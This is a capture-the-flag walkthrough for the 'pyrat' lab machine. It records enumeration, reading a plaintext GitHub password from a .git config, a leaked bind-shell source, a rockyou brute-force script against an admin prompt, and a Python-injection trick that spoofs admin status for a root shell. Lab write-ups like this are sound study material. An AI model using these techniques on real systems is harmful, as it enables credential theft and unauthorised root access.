```console
$ find / -type d -name mail 2>/dev/null
find / -type d -name mail 2>/dev/null
/var/mail
/usr/lib/python3/dist-packages/twisted/mail
$ ls /var/mail
ls /var/mail
root  think  www-data
$ ls -la /var/mail
ls -la /var/mail
total 12
drwxrwsr-x  2 root mail 4096 Jun 21  2023 .
drwxr-xr-x 12 root root 4096 Dec 22  2023 ..
lrwxrwxrwx  1 root mail    9 Jun 21  2023 root -> /dev/null
-r--r--r--  1 root mail  617 Jun 21  2023 think
lrwxrwxrwx  1 root mail    9 Jun 21  2023 www-data -> /dev/null
$ cat /var/mail/think
cat /var/mail/think
From root@pyrat  Thu Jun 15 09:08:55 2023
Return-Path: <root@pyrat>
X-Original-To: think@pyrat
Delivered-To: think@pyrat
Received: by pyrat.localdomain (Postfix, from userid 0)
        id 2E4312141; Thu, 15 Jun 2023 09:08:55 +0000 (UTC)
Subject: Hello
To: <think@pyrat>
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20230615090855.2E4312141@pyrat.localdomain>
Date: Thu, 15 Jun 2023 09:08:55 +0000 (UTC)
From: Dbile Admen <root@pyrat>

Hello jose, I wanted to tell you that i have installed the RAT you posted on your GitHub page, i'll test it tonight so don't be scared if you see it running. Regards, Dbile Admen
$ find . -type d -name ".git" 2>/dev/null
find . -type d -name ".git" 2>/dev/null
./opt/dev/.git
$ cat /opt/dev/.git/config
cat /opt/dev/.git/config
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[user]
    	name = Jose Mario
    	email = josemlwdf@github.com

[credential]
    	helper = cache --timeout=3600

[credential "https://github.com"]
    	username = think
    	password = _TH1NKINGPirate$_
```

logged into ssh with above creds escalation to root:

```console
think@ip-10-48-143-146:/opt/dev$ git show HEAD --stat
commit 0a3c36d66369fd4b07ddca72e5379461a63470bf (HEAD -> master)
Author: Jose Mario <josemlwdf@github.com>
Date:   Wed Jun 21 09:32:14 2023 +0000

    Added shell endpoint

 pyrat.py.old | 27 +++++++++++++++++++++++++++
 1 file changed, 27 insertions(+)
think@ip-10-48-143-146:/opt/dev$ git show HEAD:pyrat.py.old
...............................................

def switch_case(client_socket, data):
    if data == 'some_endpoint':
        get_this_enpoint(client_socket)
    else:
        # Check socket is admin and downgrade if is not aprooved
        uid = os.getuid()
        if (uid == 0):
            change_uid()

        if data == 'shell':
            shell(client_socket)
        else:
            exec_python(client_socket, data)

def shell(client_socket):
    try:
        import pty
        os.dup2(client_socket.fileno(), 0)
        os.dup2(client_socket.fileno(), 1)
        os.dup2(client_socket.fileno(), 2)
        pty.spawn("/bin/sh")
    except Exception as e:
        send_data(client_socket, e

...............................................
```

looks like it's looking for some special endpoint first then running `get_this_endpoint` function. Note the check is `if data == 'some_endpoint':` not `/some_endpoint` instead of fuzzing first i tried some random endoints and `admin` worked:

```console
$ nc 10.48.143.146 8000 -v
Connection to 10.48.143.146 8000 port [tcp/*] succeeded!
dashboard
name 'dashboard' is not defined
foobar
name 'foobar' is not defined
admin
Start a fresh client to begin.
^C

$ nc 10.48.143.146 8000 -v
Connection to 10.48.143.146 8000 port [tcp/*] succeeded!
admin
Password:
test
Password:
foobar
```

looks like it doesn't give any response when we enter wrong password just prompts back the password again. bruteforce script:

```python
import socket

def check_pwd(pwd: str) -> bool:
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect(("10.48.143.146", 8000))
    client.send(b"admin\n")
    client.recv(1024) # just drain the prompt, don't care what it says
    client.send(pwd.encode() + b"\n")
    data = client.recv(1024)
    client.close()
    return "Password" not in data.decode()

if __name__ == "__main__":
    with open("/usr/share/wordlists/rockyou.txt", encoding="latin-1") as f:
        passwd_lst = f.read().split("\n")

    for pwd in passwd_lst:
        if check_pwd(pwd):
            print("[+] Found", pwd)
```

got it:

```console
$ nc 10.48.143.146 8000
admin
Password:
abc123
Welcome Admin!!! Type "shell" to begin
shell
# ls
ls
pyrat.py  root.txt  snap
# cat root.txt
cat root.txt
ba5ed03e9e74bb98054438480165e221
# 
```

---

### Another easier solution

the code was:

```python
def switch_case(client_socket, data):
    if data == 'some_endpoint':
        get_this_enpoint(client_socket)
    else:
        # Check socket is admin and downgrade if is not aprooved
        uid = os.getuid()
        if (uid == 0):
            change_uid()

        if data == 'shell':
            shell(client_socket)
        else:
            exec_python(client_socket, data)

def shell(client_socket):
    try:
        import pty
        os.dup2(client_socket.fileno(), 0)
        os.dup2(client_socket.fileno(), 1)
        os.dup2(client_socket.fileno(), 2)
        pty.spawn("/bin/sh")
    except Exception as e:
        send_data(client_socket, e
```

this `uid = os.getuid()` seems dubious because if it would always lead to `root` if the script is being run as `root` the server might be doing something else in the actual running script

```python
$ nc 10.48.148.113 8000
print(globals())
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7eff578204c0>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': '/root/pyrat.py', '__cached__': None, 'socket': <module 'socket' from '/usr/lib/python3.8/socket.py'>, 'sys': <module 'sys' (built-in)>, 'StringIO': <class '_io.StringIO'>, 'datetime': <module 'datetime' from '/usr/lib/python3.8/datetime.py'>, 'os': <module 'os' from '/usr/lib/python3.8/os.py'>, 'multiprocessing': <module 'multiprocessing' from '/usr/lib/python3.8/multiprocessing/__init__.py'>, 'manager': <multiprocessing.managers.SyncManager object at 0x7eff57780640>, 'admins': <ListProxy object, typeid 'list' at 0x7eff576f49a0>, 'handle_client': <function handle_client at 0x7eff570cb8b0>, 'switch_case': <function switch_case at 0x7eff570cbe50>, 'exec_python': <function exec_python at 0x7eff570cbee0>, 'get_admin': <function get_admin at 0x7eff570cbf70>, 'shell': <function shell at 0x7eff570d2040>, 'send_data': <function send_data at 0x7eff570d20d0>, 'start_server': <function start_server at 0x7eff570d2160>, 'remove_socket': <function remove_socket at 0x7eff570d21f0>, 'is_http': <function is_http at 0x7eff570d2280>, 'fake_http': <function fake_http at 0x7eff570d2310>, 'change_uid': <function change_uid at 0x7eff570d23a0>, 'host': '0.0.0.0', 'port': 8000, '__warningregistry__': {'version': 0}}

import inspect; inspect.getsource(handle_client);  
could not get source code
import inspect; inspect.getsource(get_admin);        
could not get source code
```

looks like we can't get source code of functions let's check some global vars instead

```console
var_names = [k for k, v in globals().items() if not k.startswith('__') and not callable(v)]; print(var_names)
['socket', 'sys', 'datetime', 'os', 'multiprocessing', 'manager', 'admins', 'host', 'port']

print(type(admins))
<class 'multiprocessing.managers.ListProxy'>

print(admins)
[]
```

interesting admins is just an empty list. theory:

```python
admins = []  # global list

def switch_case(client_socket, data):
    if str(client_socket) not in admins:
        change_uid()  # drop from root to normal user
    
    if data == 'shell':
        shell(client_socket)
```

let's confirm it:

```
$ nc 10.49.164.56 8000 -v
Connection to 10.49.164.56 8000 port [tcp/*] succeeded!
admins.append(str(client_socket));

print(admins);
["<socket.socket fd=7, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('10.49.164.56', 8000), raddr=('192.168.247.244', 50072)>"]

^C
```

then make sure to connect with the same port quickly

```
$ sudo ncat 10.49.164.56 8000 --source-port 50072
shell
# whoami
root
```
